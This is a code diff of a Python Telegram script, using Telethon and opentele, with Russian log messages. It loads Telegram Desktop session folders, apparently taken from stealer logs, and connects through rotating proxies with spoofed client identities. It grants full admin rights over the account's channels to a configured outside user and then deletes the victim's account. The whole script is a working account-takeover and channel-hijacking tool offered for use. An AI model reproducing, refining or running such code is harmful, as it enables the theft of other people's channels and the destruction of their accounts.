@@ -4,50 +4,69 @@ from opentele.api import UseCurrentSession
 from telethon.tl.types import ChannelParticipantsAdmins
 from telethon.tl.functions.channels import InviteToChannelRequest
 from opentele.api import API
-from telethon.tl.functions.messages import ImportChatInviteRequest
 from telethon.tl.functions.account import DeleteAccountRequest
 from telethon import functions
 from telethon.errors import RPCError
-import asyncio,re,json,shutil,random,os,python_socks,sys
+import asyncio,re,json,shutil,os,python_socks,sys
 from random import choice
 from telethon import TelegramClient
 import warnings
+
+
 warnings.filterwarnings("ignore", category=DeprecationWarning)
 
-if not os.path.exists('proxies.txt'):
-    with open('proxies.txt','w',encoding='utf-8') as file:
+PROXY_FILE = 'proxies.txt'
+if not os.path.exists(PROXY_FILE):
+    with open(PROXY_FILE, 'w', encoding='utf-8') as file:
         file.write('')
+        
+with open(PROXY_FILE, 'r', encoding='utf-8') as proxy_file:
+    proxies = [proxy.strip() for proxy in proxy_file]
+    
+logger.success(f'[+] Загружено {len(proxies)} прокси')
 
-with open('proxies.txt','r',encoding='utf-8') as proxy_file:
-    proxies = proxy_file.read().split('\n')
+CONFIG_FILE = "config.json"
+if not os.path.exists(CONFIG_FILE):
+    logger.error(f"Файл конфигурации '{CONFIG_FILE}' не найден!")
+    exit(1)
+    
+with open(CONFIG_FILE, "r", encoding="utf-8") as file:
+    cfg = json.load(file)
+    
+REQUIRED_DIRS = ['tdatas', 'results', 'NotFoundTdata']
+for directory in REQUIRED_DIRS:
+    os.makedirs(directory, exist_ok=True)
 
-logger.success(f'[+] Загружено {len(proxies)} прокси\n')
 
-with open("config.json","r",encoding="utf-8") as file:
-    cfg = json.loads(file.read())
-
-
-def move_log(path,path_2):
+def move_log(src, dest):
     try:
-        shutil.move(path, path_2)
-    except:
+        shutil.move(src, dest)
+    except Exception as e:
         try:
-            shutil.rmtree(path)
+            shutil.rmtree(src)
         except:
             pass
 
 
 async def main():
+    def parse_proxy(proxy_str):
+        try:
+            parts = proxy_str.split(":")
+            return {
+                'proxy_type': ProxyType.SOCKS5,
+                'addr': parts[0],
+                'port': int(parts[1]),
+                'username': parts[2] if len(parts) > 2 else None,
+                'password': parts[3] if len(parts) > 3 else None,
+                'rdns': True
+            }
+        except Exception as e:
+            logger.error(f"Invalid proxy format: {proxy_str} - {e}")
+            return None
     
     userName = cfg['to_invite_username']
     userId = cfg['to_invite_id']
 
-    if not os.path.isdir('tdatas'):
-        os.mkdir('tdatas')
-    if not os.path.isdir('results'):
-        os.mkdir('results')
-    if not os.path.isdir('NotFoundTdata'):
-        os.mkdir('NotFoundTdata')
     for tdata_folder in os.listdir('tdatas'):
         tdataFolder = f'tdatas/{tdata_folder}'
         if os.path.isdir(tdataFolder):
@@ -61,24 +80,17 @@ async def main():
                 session = f"tdatas/{tdata_folder}/telethon.session"
                 if os.path.exists(session):
                     os.remove(session)
-                listapi = [API.TelegramAndroid.Generate, API.TelegramDesktop.Generate,
-                            API.TelegramAndroidX.Generate,
-                            API.TelegramIOS.Generate, API.TelegramMacOS.Generate]
-                api = random.choice(listapi)
-                try:
-                    proxy = choice(proxies)
-                    proxy2 = {
-                        'proxy_type': python_socks.ProxyType.SOCKS5
-                        'addr': proxy.split(":")[0],
-                        'port': int(proxy.split(":")[1]),
-                        'username': proxy.split(":")[2],
-                        'password': proxy.split(":")[3], 
-                        'rdns': True
-                    }
-                    client = await tdesk.ToTelethon(session=session, api=api, flag=UseCurrentSession,
-                                                    proxy=proxy2)
-                except:
+                if proxies == []:
                     client = await tdesk.ToTelethon(session=session, flag=UseCurrentSession)
+                else:
+                    listapi = [API.TelegramAndroid.Generate, API.TelegramDesktop.Generate,
+                                API.TelegramAndroidX.Generate,
+                                API.TelegramIOS.Generate, API.TelegramMacOS.Generate]
+                    try:
+                        proxy = parse_proxy(choice(proxies))
+                        client = await tdesk.ToTelethon(session=session, api=choice(listapi), flag=UseCurrentSession,proxy=proxy)
+                    except:
+                        client = await tdesk.ToTelethon(session=session, flag=UseCurrentSession)
                 try:
                     try:
                         await client.connect()
@@ -181,20 +193,23 @@ async def search_chats(client,user_info,path,userId,userName):
         async for dialog in dialogs:
             if dialog.id in r_k:
                 await client.get_participants(dialog.id)
-                while True:
+                attempts = 0
+                while attempts <= cfg['attempts']:
                     try:
                         await client.edit_admin(dialog.id, userId, is_admin=True, add_admins=True)
+                        logger.success("[+] Права админа успешно переданы!")
                         break
                     except Exception as er:
                         logger.error(str(er))
+                        if 'Too many requests' in str(er):
+                            attempts += 1
                         logger.error('Спим 15 секунд и перевязываем снова')
                         await asyncio.sleep(15)
-                logger.success("[+] Права админа успешно переданы!")
     print()
     if len(r_k) >= 1:
-        logger.success(f'[+] Перевязано {len(r_k)} каналов')
         try:
             await client(DeleteAccountRequest(reason=''))
+            logger.success(f'[+] Аккаунт удалён | {user_info.first_name} {user_info.last_name}')
         except asyncio.CancelledError:
             print("Task was cancelled.")
         except RPCError as e:
@@ -202,9 +217,7 @@ async def search_chats(client,user_info,path,userId,userName):
         except Exception as e:
             print(f"An unexpected error occurred: {e}")
 
-        logger.success(f'[+] Аккаунт удалён | {user_info.first_name} {user_info.last_name}')
-    else:
-        logger.info(f'[-] Перевязано {len(r_k)} каналов')
+    logger.info(f'[-] Перевязано {len(r_k)} каналов')
     await client.disconnect()
     move_log(path,f'results/{len(r_k)}_channels_{user_info.id}')
 
